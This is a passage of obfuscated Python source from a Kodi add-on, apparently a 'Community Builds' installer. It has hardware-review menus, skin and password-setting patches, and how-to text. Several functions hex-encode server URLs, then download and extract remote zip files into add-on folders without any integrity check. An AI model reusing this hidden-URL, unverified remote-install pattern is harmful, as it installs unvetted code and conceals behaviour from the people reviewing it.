 I11iiI1I1 = str ( '[COLOR=gold]Available From: [/COLOR] [COLOR=lime]www.totalboxshop.tv[/COLOR][CR][CR][COLOR=dodgerblue]Added: [/COLOR]' + ooO00Oo + '[CR][COLOR=dodgerblue]Manufacturer: [/COLOR]' + iiIi11I1IIiiii + '[CR][COLOR=dodgerblue]Supported Roms: [/COLOR]' + o0o0 + '[CR][COLOR=dodgerblue]Chipset: [/COLOR]' + Iiii1Ii1I + '[CR][COLOR=dodgerblue]CPU: [/COLOR]' + IiIi1II111I + '[CR][COLOR=dodgerblue]GPU: [/COLOR]' + o00oIIi1i1 + '[CR][COLOR=dodgerblue]RAM: [/COLOR]' + o0O0Ooo + '[CR][COLOR=dodgerblue]Flash: [/COLOR]' + O0oO00oOOooO + '[CR][COLOR=dodgerblue]Wi-Fi: [/COLOR]' + IiIIii1iiI + '[CR][COLOR=dodgerblue]Bluetooth: [/COLOR]' + ii1IiiII + '[CR][COLOR=dodgerblue]LAN: [/COLOR]' + IiiI1II1II1i + '[CR][CR][COLOR=yellow]About: [/COLOR]' + IIIII1 + '[CR][CR][COLOR=yellow]Summary:[/COLOR][CR][CR][COLOR=dodgerblue]Pros:[/COLOR]    ' + iIO0OO0o0O00oO + '[CR][CR][COLOR=dodgerblue]Cons:[/COLOR]  ' + o00O + '[CR][CR][COLOR=yellow]Benchmark Results:[/COLOR][CR][CR][COLOR=dodgerblue]Boot Time:[/COLOR][CR]' + OOooo000OooO + '[CR][CR][COLOR=dodgerblue]Time taken to scan 1,000 movies (local NFO files):[/COLOR][CR]' + oO0o0oOo + '[CR][CR][COLOR=dodgerblue]Copy 4,000 files (660.8MB) locally:[/COLOR][CR]' + o0o0OoOo + '[CR][CR][COLOR=dodgerblue]Copy a MP4 file (339.4MB) locally:[/COLOR][CR]' + IiI1 + '[CR][CR][COLOR=dodgerblue]Ethernet Speed - Copy MP4 (339.4MB) from SMB share to device:[/COLOR][CR]' + iiIiII + '[CR][CR][COLOR=dodgerblue]4k Playback:[/COLOR][CR]' + OoO0O0oo0o + '[CR][CR][COLOR=dodgerblue]1080p Playback:[/COLOR][CR]' + iIi11I11 + '[CR][CR][COLOR=dodgerblue]720p Playback:[/COLOR][CR]' + i1i + '[CR][CR][COLOR=dodgerblue]Audio Playback:[/COLOR][CR]' + iiIi1iIii1i111 + '[CR][CR][COLOR=dodgerblue]Image Slideshow:[/COLOR][CR]' + IIiiiI1iI )
 o0i1Ii11II = str ( '[COLOR=gold]Availability: [/COLOR]Sorry this device is currently unavailable at [COLOR=lime]www.totalboxshop.tv[/COLOR][CR][CR][COLOR=dodgerblue]Added: [/COLOR]' + ooO00Oo + '[CR][COLOR=dodgerblue]Manufacturer: [/COLOR]' + iiIi11I1IIiiii + '[CR][COLOR=dodgerblue]Supported Roms: [/COLOR]' + o0o0 + '[CR][COLOR=dodgerblue]Chipset: [/COLOR]' + Iiii1Ii1I + '[CR][COLOR=dodgerblue]CPU: [/COLOR]' + IiIi1II111I + '[CR][COLOR=dodgerblue]GPU: [/COLOR]' + o00oIIi1i1 + '[CR][COLOR=dodgerblue]RAM: [/COLOR]' + o0O0Ooo + '[CR][COLOR=dodgerblue]Flash: [/COLOR]' + O0oO00oOOooO + '[CR][COLOR=dodgerblue]Wi-Fi: [/COLOR]' + IiIIii1iiI + '[CR][COLOR=dodgerblue]Bluetooth: [/COLOR]' + ii1IiiII + '[CR][COLOR=dodgerblue]LAN: [/COLOR]' + IiiI1II1II1i + '[CR][CR][COLOR=yellow]About: [/COLOR]' + IIIII1 + '[CR][CR][COLOR=yellow]Summary:[/COLOR][CR][CR][COLOR=dodgerblue]Pros:[/COLOR]    ' + iIO0OO0o0O00oO + '[CR][CR][COLOR=dodgerblue]Cons:[/COLOR]  ' + o00O + '[CR][CR][COLOR=gold]4k Playback:[/COLOR]  ' + OoO0O0oo0o + '[CR][CR][COLOR=gold]1080p Playback:[/COLOR]  ' + iIi11I11 + '[CR][CR][COLOR=gold]720p Playback:[/COLOR]  ' + i1i + '[CR][CR][COLOR=gold]DTS Compatibility:[/COLOR]  ' + iiIi1iIii1i111 + '[CR][CR][COLOR=gold]Time taken to scan 100 movies:[/COLOR]  ' + oO0o0oOo )
 if IIIII1 != '' and o0OI1 != '' :
  Ii ( '' , '[COLOR=yellow][Text Guide][/COLOR]  Official Description' , I11iiI1I1 , 'text_guide' , 'TotalXBMC_Guides.png' , o00 , '' , '' )
 if IIIII1 != '' and o0OI1 == '' :
  Ii ( '' , '[COLOR=yellow][Text Guide][/COLOR]  Official Description' , o0i1Ii11II , 'text_guide' , 'TotalXBMC_Guides.png' , o00 , '' , '' )
 if O0oO0o0OOOOOO != 'None' :
  Ii ( '' , '[COLOR=lime][VIDEO][/COLOR]   Benchmark Review' , O0oO0o0OOOOOO , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if o0O0ooooooo00 != 'None' :
  Ii ( '' , '[COLOR=lime][VIDEO][/COLOR]   Official Video Preview' , o0O0ooooooo00 , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if oooOOOOOi1iIii != 'None' :
  Ii ( '' , '[COLOR=lime][VIDEO][/COLOR]   Official Video Guide' , oooOOOOOi1iIii , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if O00Ooo != 'None' :
  Ii ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + O0OOooOoO , O00Ooo , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if OOOO0OOO != 'None' :
  Ii ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + i1II1I1Iii1 , OOOO0OOO , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if i1i1ii != 'None' :
  Ii ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + iiI11Iii , i1i1ii , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if iII1ii1 != 'None' :
  Ii ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + O0o0O0 , iII1ii1 , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if I1i1iiiI1 != 'None' :
  Ii ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + Ii1II1I11i1 , I1i1iiiI1 , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
  if 33 - 33: O0oO . Iii1i1I11I . OOO00OoOO00
  if 15 - 15: Ooo0Oo0 . ooOO0o
def o0Iiii ( ) :
 Ii ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , 'hardware' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime]All Devices[/COLOR]' , '' , 'grab_hardware' , 'All.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Game Consoles' , 'device=Console' , 'grab_hardware' , 'Consoles.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Hardware][/COLOR] HTPC' , 'device=HTPC' , 'grab_hardware' , 'HTPC.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Phones' , 'device=Phone' , 'grab_hardware' , 'Phones.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Set Top Boxes' , 'device=STB' , 'grab_hardware' , 'STB.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Tablets' , 'device=Tablet' , 'grab_hardware' , 'Tablets.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][Accessories][/COLOR] Remotes/Keyboards' , 'device=Remote' , 'grab_hardware' , 'Remotes.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][Accessories][/COLOR] Gaming Controllers' , 'device=Controller' , 'grab_hardware' , 'Controllers.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][Accessories][/COLOR] Dongles' , 'device=Dongle' , 'grab_hardware' , 'Dongles.png' , '' , '' , '' )
 if 45 - 45: OoO0O00 / oO00Oo0o000 . Iii1i1I11I + II11iII
 if 51 - 51: ooOO0o % i11iIiiIii % O0oO + i1OOO % Ooo0Oo0
def IIIII ( url ) :
 Ii ( 'folder' , '[COLOR=yellow][CPU][/COLOR] Allwinner Devices' , str ( url ) + '&chip=Allwinner' , 'grab_hardware' , 'Allwinner.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=yellow][CPU][/COLOR] AMLogic Devices' , str ( url ) + '&chip=AMLogic' , 'grab_hardware' , 'AMLogic.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=yellow][CPU][/COLOR] Intel Devices' , str ( url ) + '&chip=Intel' , 'grab_hardware' , 'Intel.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=yellow][CPU][/COLOR] Rockchip Devices' , str ( url ) + '&chip=Rockchip' , 'grab_hardware' , 'Rockchip.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][Platform][/COLOR] Android' , str ( url ) + '&platform=Android' , 'grab_hardware' , 'Android.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][Platform][/COLOR] iOS' , str ( url ) + '&platform=iOS' , 'grab_hardware' , 'iOS.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][Platform][/COLOR] Linux' , str ( url ) + '&platform=Linux' , 'grab_hardware' , 'Linux.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][Platform][/COLOR] OpenELEC' , str ( url ) + '&platform=OpenELEC' , 'grab_hardware' , 'OpenELEC.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][Platform][/COLOR] OSX' , str ( url ) + '&platform=OSX' , 'grab_hardware' , 'OSX.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][Platform][/COLOR] Pure Linux' , str ( url ) + '&platform=Custom_Linux' , 'grab_hardware' , 'Custom_Linux.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][Platform][/COLOR] Windows' , str ( url ) + '&platform=Windows' , 'grab_hardware' , 'Windows.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 4GB' , str ( url ) + '&flash=4GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 8GB' , str ( url ) + '&flash=8GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 16GB' , str ( url ) + '&flash=16GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 32GB' , str ( url ) + '&flash=32GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 64GB' , str ( url ) + '&flash=64GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][RAM][/COLOR] 1GB' , str ( url ) + '&ram=1GB' , 'grab_hardware' , 'RAM.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][RAM][/COLOR] 2GB' , str ( url ) + '&ram=2GB' , 'grab_hardware' , 'RAM.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][RAM][/COLOR] 4GB' , str ( url ) + '&ram=4GB' , 'grab_hardware' , 'RAM.png' , '' , '' , '' )
 if 8 - 8: OoOo
 if 16 - 16: iii11I111 . Oo000o
 if 50 - 50: oO00Oo0o000 * OoOo + Ooo0Oo0 - i11iIiiIii + iiiIi1i1I * Ooo0Oo0
def i11II ( ) :
 iIii1 = xbmc . getSkinDir ( )
 Iii = xbmc . translatePath ( os . path . join ( o0oO0 , iIii1 ) )
 for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( Iii ) :
  for IiI11i1IIiiI in i1i1i1I :
   if 'DialogKeyboard.xml' in IiI11i1IIiiI :
    iIii1 = os . path . join ( Ii1IIii , IiI11i1IIiiI )
    ooO00O0O0 = open ( iIii1 ) . read ( )
    iII1I1 = ooO00O0O0 . replace ( '<control type="label" id="310"' , '<control type="edit" id="312"' )
    IiI11i1IIiiI = open ( iIii1 , mode = 'w' )
    IiI11i1IIiiI . write ( iII1I1 )
    IiI11i1IIiiI . close ( )
    OoOo000oOo0oo ( iIii1 )
    for Oo0OOo in range ( 48 , 58 ) :
     ii1iii11i1 ( Oo0OOo , iIii1 )
 IiI = xbmcgui . Dialog ( )
 IiI . ok ( "Skin Changes Successful" , 'A BIG thank you to Mikey1234 for this fix. The' , 'code used for this function was ported from the' , 'Xunity Maintenance add-on' )
 xbmc . executebuiltin ( 'ReloadSkin()' )
 if 69 - 69: i1OOO - o0oO % ooOO0o . oOOoO0O0O0 - oOOoO0O0O0
def o0oO00o ( ) :
 IiI = xbmcgui . Dialog ( )
 iI1Ii = xbmcgui . Dialog ( ) . yesno ( 'Convert This Skin To Kodi (Helix)?' , 'This will fix the problem with a blank on-screen keyboard' , 'showing in skins designed for Gotham (being run on Kodi).' , 'This will only affect the currently running skin.' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Fix' )
 if iI1Ii == 0 :
  return
 elif iI1Ii == 1 :
  i11II ( )
  if 78 - 78: iiiIi1i1I * i1OOO - Iii1i1I11I - II11iII
  if 83 - 83: oO00Oo0o000 / oOOoO0O0O0
def i11iI1 ( ) :
 if IiI . yesno ( "Hide Passwords" , "This will hide all your passwords in your" , "add-on settings, are you sure you wish to continue?" ) :
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( o0oO0 ) :
   for IiI11i1IIiiI in i1i1i1I :
    if IiI11i1IIiiI == 'settings.xml' :
     i1Ii11ii1I = open ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) ) . read ( )
     oOOO00o000o = re . compile ( '<setting id=(.+?)>' ) . findall ( i1Ii11ii1I )
     for OO0oI1iii1i in oOOO00o000o :
      if 'pass' in OO0oI1iii1i :
       if not 'option="hidden"' in OO0oI1iii1i :
        try :
         oO0ooOoOO = OO0oI1iii1i . replace ( '/' , ' option="hidden"/' )
         IiI11i1IIiiI = open ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) , mode = 'w' )
         IiI11i1IIiiI . write ( str ( i1Ii11ii1I ) . replace ( OO0oI1iii1i , oO0ooOoOO ) )
         IiI11i1IIiiI . close ( )
        except :
         pass
  IiI . ok ( "Passwords Hidden" , "Your passwords will now show as stars (hidden), if you" , "want to undo this please use the option to unhide passwords." )
  if 48 - 48: O0OOO . i11iIiiIii % oO00Oo0o000 - iii11I111 . i11iIiiIii
  if 61 - 61: i1OOO % iiIi + iiiIi1i1I + oO00Oo0o000 * i1OOO % oOOoO0O0O0
def iiiI11 ( url ) :
 o0o00OOOO = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f67756973657474696e67732e7068703f69643d2573'
 i1iIi = binascii . unhexlify ( o0o00OOOO ) % ( url )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 I1I11iO0 = re . compile ( 'guisettings="(.+?)"' ) . findall ( ooOOoooooo )
 O0oOoo0OoO0O = I1I11iO0 [ 0 ] if ( len ( I1I11iO0 ) > 0 ) else 'None'
 o0OIIiI1I1 ( O0oOoo0OoO0O , I11I1IIiiII1 )
 if 42 - 42: oO00Oo0o000 * ooOO0o
 if 2 - 2: ooOO0o . II11iII / OOO00OoOO00
def IIO000oooOO0Oo0 ( path ) :
 I1iIiIii = xbmc . translatePath ( os . path . join ( o0O , 'background_art' , '' ) )
 if os . path . exists ( I1iIiIii ) :
  I1o0o0OoOOOOOo ( I1iIiIii )
 time . sleep ( 1 )
 if not os . path . exists ( I1iIiIii ) :
  os . makedirs ( I1iIiIii )
 try :
  ooOo . create ( "Installing Artwork" , "Downloading artwork pack" , '' , 'Please Wait' )
  i1iiIIIi = os . path . join ( oO , I1IiiI + '_artpack.zip' )
  downloader . download ( path , i1iiIIIi , ooOo )
  time . sleep ( 1 )
  if 76 - 76: II11iII . Iii1i1I11I % i1OOO * OoO0O00
  ooOo . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Checking " , '' , 'Please Wait' )
  ooOo . update ( 0 , "" , "Extracting Zip Please Wait" )
  iIIII1iIIii ( i1iiIIIi , I1iIiIii , ooOo )
 except : pass
 if 23 - 23: O0oO + Ii1iIIIi1ii
 if 14 - 14: O0OOO % O0oO % OoO0O00 * OOO00OoOO00
def OoOo0oOooOoOO ( repo_id ) :
 Iii1II1iiiiI = 1
 o0OOO00ooo = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f646570656e64656e6379696e7374616c6c2e7068703f69643d2573'
 i1iIi = binascii . unhexlify ( o0OOO00ooo ) % ( repo_id )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 O0 = re . compile ( 'name="(.+?)"' ) . findall ( ooOOoooooo )
 o00oooO0Oo = re . compile ( 'version="(.+?)"' ) . findall ( ooOOoooooo )
 I1iI1iIi111i = re . compile ( 'repo_url="(.+?)"' ) . findall ( ooOOoooooo )
 iiIi1IIi1I = re . compile ( 'data_url="(.+?)"' ) . findall ( ooOOoooooo )
 o0OoOO000ooO0 = re . compile ( 'zip_url="(.+?)"' ) . findall ( ooOOoooooo )
 o00o0 = re . compile ( 'repo_id="(.+?)"' ) . findall ( ooOOoooooo )
 I1iI11IiiI11i = O0 [ 0 ] if ( len ( O0 ) > 0 ) else ''
 IIIIiiIiiI = o00oooO0Oo [ 0 ] if ( len ( o00oooO0Oo ) > 0 ) else ''
 O000O = I1iI1iIi111i [ 0 ] if ( len ( I1iI1iIi111i ) > 0 ) else ''
 Oo00OO0 = iiIi1IIi1I [ 0 ] if ( len ( iiIi1IIi1I ) > 0 ) else ''
 oo0O = o0OoOO000ooO0 [ 0 ] if ( len ( o0OoOO000ooO0 ) > 0 ) else ''
 oO00OoOOOo = o00o0 [ 0 ] if ( len ( o00o0 ) > 0 ) else ''
 IIIiIIIi11I = xbmc . translatePath ( os . path . join ( OO0oOoo , I1iI11IiiI11i + '.zip' ) )
 II1O0o00 = xbmc . translatePath ( os . path . join ( o0oO0 , oO00OoOOOo ) )
 try :
  downloader . download ( O000O , IIIiIIIi11I , ooOo )
  iIIII1iIIii ( IIIiIIIi11I , II11iiii1Ii , ooOo )
 except :
  try :
   downloader . download ( oo0O , IIIiIIIi11I , ooOo )
   iIIII1iIIii ( IIIiIIIi11I , II11iiii1Ii , ooOo )
  except :
   try :
    if not os . path . exists ( II1O0o00 ) :
     os . makedirs ( II1O0o00 )
    ooOOoooooo = II1I ( Oo00OO0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    oOOO00o000o = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( ooOOoooooo )
    for iIi11i1 in oOOO00o000o :
     oO00oo0o00o0o = xbmc . translatePath ( os . path . join ( II1O0o00 , iIi11i1 ) )
     if iiIiii1IIIII not in iIi11i1 and '/' not in iIi11i1 :
      try :
       ooOo . update ( 0 , "Downloading [COLOR=yellow]" + iIi11i1 + '[/COLOR]' , '' , 'Please wait...' )
       print "downloading: " + Oo00OO0 + iIi11i1
       downloader . download ( Oo00OO0 + iIi11i1 , oO00oo0o00o0o , ooOo )
      except : print "failed to install" + iIi11i1
     if '/' in iIi11i1 and '..' not in iIi11i1 and 'http' not in iIi11i1 :
      IiIIIIIi = Oo00OO0 + iIi11i1
      IiIi1iIIi1 ( oO00oo0o00o0o , IiIIIIIi )
   except :
    IiI . ok ( "Error downloading repository" , 'There was an error downloading the [COLOR=yellow]' + I1iI11IiiI11i , '[/COLOR]repository. Please consider updating the add-on portal with details' , 'or report the error on the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]' )
    Iii1II1iiiiI = 0
 if Iii1II1iiiiI == 1 :
  time . sleep ( 1 )
  ooOo . update ( 0 , "[COLOR=yellow]" + I1iI11IiiI11i + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Now installing dependencies' )
  time . sleep ( 1 )
  oo00ooOoO00 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f646f776e6c6f6164636f756e742e7068703f69643d2573'
  o00oOoOo0 = binascii . unhexlify ( oo00ooOoO00 ) % ( repo_id )
  II1I ( o00oOoOo0 )
  if 48 - 48: Oo000o + oO00Oo0o000 + ooOO0o / Oo000o / ooOO0o
  if 71 - 71: O0oO
def i1I11I ( ) :
 Ii ( '' , '[COLOR=dodgerblue][TEXT GUIDE][/COLOR]  What is Community Builds?' , 'url' , 'instructions_3' , 'How_To.png' , '' , '' , '' )
 Ii ( '' , '[COLOR=dodgerblue][TEXT GUIDE][/COLOR]  Creating a Community Build' , 'url' , 'instructions_1' , 'How_To.png' , '' , '' , '' )
 Ii ( '' , '[COLOR=dodgerblue][TEXT GUIDE][/COLOR]  Installing a Community Build' , 'url' , 'instructions_2' , 'How_To.png' , '' , '' , '' )
 Ii ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Add Your Own Guides @ [COLOR=lime]TotalXBMC.tv[/COLOR]' , 'K0XIxEodUhc' , 'play_video' , 'How_To.png' , '' , '' , '' )
 Ii ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Community Builds FULL GUIDE' , "ewuxVfKZ3Fs" , 'play_video' , 'howto.png' , '' , '' , '' )
 Ii ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  IMPORTANT initial settings' , "1vXniHsEMEg" , 'play_video' , 'howto.png' , '' , '' , '' )
 Ii ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Install a Community Build' , "kLsVOapuM1A" , 'play_video' , 'howto.png' , '' , '' , '' )
 Ii ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Fixing a half installed build (guisettings.xml fix)' , "X8QYLziFzQU" , 'play_video' , 'howto.png' , '' , '' , '' )
 Ii ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  [COLOR=yellow](OLD METHOD)[/COLOR]Create a Community Build (part 1)' , "3rMScZF2h_U" , 'play_video' , 'howto.png' , '' , '' , '' )
 Ii ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  [COLOR=yellow](OLD METHOD)[/COLOR]Create a Community Build (part 2)' , "C2IPhn0OSSw" , 'play_video' , 'howto.png' , '' , '' , '' )
 if 34 - 34: OoO0O00 * iii11I111 + oOOoO0O0O0 / O0oO / iiiIi1i1I
 if 14 - 14: ooOO0o - Oo000o * Iii1i1I11I + oOOoO0O0O0 . I1i1iii
def i1i1I11i1I ( ) :
 Ii1ii11IIIi ( 'Creating A Community Backup' ,
 '[COLOR=yellow]NEW METHOD[/COLOR][CR][COLOR=blue][B]Step 1:[/COLOR] Remove any sensitive data[/B][CR]Make sure you\'ve removed any sensitive data such as passwords and usernames in your addon_data folder.'
 '[CR][CR][COLOR=blue][B]Step 2:[/COLOR] Backup your system[/B][CR]Choose the backup option from the main menu, in there you\'ll find the option to create a Full Backup and this will create two zip files that you need to upload to a server.'
 '[CR][CR][COLOR=blue][B]Step 3:[/COLOR] Upload the zips[/B][CR]Upload the two zip files to a server that Kodi can access, it has to be a direct link and not somewhere that asks for captcha - Dropbox and archive.org are two good examples.'
 '[CR][CR][COLOR=blue][B]Step 4:[/COLOR] Submit build at TotalXBMC[/B]'
 '[CR]Create a thread on the Community Builds section of the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B].[CR]Full details can be found on there of the template you should use when posting, once you\'ve created your support thread (NOT BEFORE) you can request to become a member of the Community Builder group and you\'ll then have access to the web form for adding your builds to the portal.'
 '[CR][CR][COLOR=yellow]OLD METHOD[/COLOR][CR][COLOR=blue][B]Step 1: Backup your system[/B][/COLOR][CR]Choose the backup option from the main menu, you will be asked whether you would like to delete your addon_data folder. If you decide to choose this option [COLOR=yellow][B]make sure[/COLOR][/B] you already have a full backup of your system as it will completely wipe your addon settings (any stored settings such as passwords or any other changes you\'ve made to addons since they were first installed). If sharing a build with the community it\'s highly advised that you wipe your addon_data but if you\'ve made changes or installed extra data packages (e.g. skin artwork packs) then backup the whole build and then manually delete these on your PC and zip back up again (more on this later).'
 '[CR][CR][COLOR=blue][B]Step 2: Edit zip file on your PC[/B][/COLOR][CR]Copy your backup.zip file to your PC, extract it and delete all the addons and addon_data that isn\'t required.'
 '[CR][COLOR=blue]What to delete:[/COLOR][CR][COLOR=lime]/addons/packages[/COLOR] This folder contains zip files of EVERY addon you\'ve ever installed - it\'s not needed.'
 '[CR][COLOR=lime]/addons/<skin.xxx>[/COLOR] Delete any skins that aren\'t used, these can be very big files.'
 '[CR][COLOR=lime]/addons/<addon_id>[/COLOR] Delete any other addons that aren\'t used, it\'s easy to forget you\'ve got things installed that are no longer needed.'
 '[CR][COLOR=lime]/userdata/addon_data/<addon_id>[/COLOR] Delete any folders that don\'t contain important changes to addons. If you delete these the associated addons will just reset to their default values.'
 '[CR][COLOR=lime]/userdata/<all other folders>[/COLOR] Delete all other folders in here such as keymaps. If you\'ve setup profiles make sure you [COLOR=yellow][B]keep the profiles directory[/COLOR][/B].'
 '[CR][COLOR=lime]/userdata/Thumbnails/[/COLOR] Delete this folder, it contains all cached artwork. You can safely delete this but must also delete the file listed below.'
 '[CR][COLOR=lime]/userdata/Database/Textures13.db[/COLOR] Delete this and it will tell XBMC to regenerate your thumbnails - must do this if delting thumbnails folder.'
 '[CR][COLOR=lime]/xbmc.log (or Kodi.log)[/COLOR] Delete your log files, this includes any crashlog files you may have.'
 '[CR][CR][COLOR=blue][B]Step 3: Compress and upload[/B][/COLOR][CR]Use a program like 7zip to create a zip file of your remaining folders and upload to a file sharing site like dropbox.'
 '[CR][CR][COLOR=blue][B]Step 4: Submit build at TotalXBMC[/B][/COLOR]'
 '[CR]Create a thread on the Community Builds section of the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B].[CR]Full details can be found on there of the template you should use when posting.' )
 if 85 - 85: oO00Oo0o000 . O0OOO / oOOoO0O0O0 * oO00Oo0o000 - II11iII - i11iIiiIii
 if 25 - 25: oO00Oo0o000 % iiiIi1i1I - oOOoO0O0O0
def O0OoOOooO0O ( ) :
 Ii1ii11IIIi ( 'Installing a community build' , '[COLOR=blue][B]Step 1 (Optional): Backup your system[/B][/COLOR][CR]We highly recommend creating a backup of your system in case you don\'t like the build and want to revert back. Choose the backup option from the main menu, you will be asked whether you would like to delete your addon_data folder, select no unless you want to lose all your settings. If you ever need your backup it\'s stored in the location you\'ve selected in the addon settings.'
 '[CR][CR][COLOR=blue][B]Step 2: Browse the Community Builds[/B][/COLOR][CR]Find a community build you like the look of and make sure you read the description as it could contain unsuitable content or have specific install instructions. Once you\'ve found the build you want to install click on the install option and you\'ll have the option of a fresh install or a merge . The merge option will leave all your existing addons and userdata in place and just add the contents of the new build whereas the fresh (wipe) option will completely wipe your existing data and replace with content on the new build. Once you make your choice the download and extraction process will begin.'
 '[CR][CR][COLOR=blue][B]Step 3: [/COLOR][COLOR=red]VERY IMPORTANT[/COLOR][/B][CR]For the install to complete properly you MUST change the skin to the relevant skin used for that build. You will see a dialog box telling you which skin to switch to and then you\'ll be taken to the appearance settings where you can switch skins.'
 '[CR][CR][COLOR=blue][B]Step 4:[/B][/COLOR] Now go back to the Community Builds addon and in the same section wehre you clicked on step 1 of the install process you now need to select step 2 so it can install the guisettings.xml. This is extremely important, if you don\'t do this step then you\'ll end up with a real mish-mash hybrid install!'
 '[CR][CR][COLOR=blue][B]Step 5:[/B][/COLOR] You will now need to restart Kodi so the settings stick, just quit and it should all be fine. If for any reason the settings did not stick and it still doesn\'t look quite right just do step 2 of the install process again (guisettings.xml fix)' )
 if 3 - 3: I1i1iii - OoO0O00 % OoOo / OOO00OoOO00
 if 44 - 44: O0OOO . OoO0O00 * ooOO0o / i11iIiiIii
def OOOO00o000o ( ) :
 Ii1ii11IIIi ( 'What is a community build' , 'Community Builds are pre-configured builds of XBMC/Kodi based on different users setups. Have you ever watched youtube videos or seen screenshots of Kodi in action and thought "wow I wish I could do that"? Well now you can have a brilliant setup at the click of a button, completely pre-configured by users on the [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B] forum. If you\'d like to get involved yourself and share your build with the community it\'s very simple to do, just go to the forum where you\'ll find full details or you can follow the guide in this addon.' )
 if 60 - 60: ooOO0o - Ii1iIIIi1ii
 if 13 - 13: Ooo0Oo0 . O0oO
def IIII1ii1 ( url = 'http://www.iplocation.net/' , inc = 1 ) :
 oOOO00o000o = re . compile ( "<td width='80'>(.+?)</td><td>(.+?)</td><td>(.+?)</td><td>.+?</td><td>(.+?)</td>" ) . findall ( O0OoO000O0OO . http_GET ( url ) . content )
 for OOO0O0OOo , Iii1 , OOoOi1IiiI , O0OOO0 in oOOO00o000o :
  if inc < 2 : IiI = xbmcgui . Dialog ( ) ; IiI . ok ( 'Check My IP' , "[B][COLOR gold]Your IP Address is: [/COLOR][/B] %s" % OOO0O0OOo , '[B][COLOR gold]Your IP is based in: [/COLOR][/B] %s' % OOoOi1IiiI , '[B][COLOR gold]Your Service Provider is:[/COLOR][/B] %s' % O0OOO0 )
  inc = inc + 1
  if 61 - 61: oO00Oo0o000 . i11iIiiIii + OOO00OoOO00
  if 8 - 8: Ii1iIIIi1ii
  if 55 - 55: OOO00OoOO00
def iiIiiIi1 ( ) :
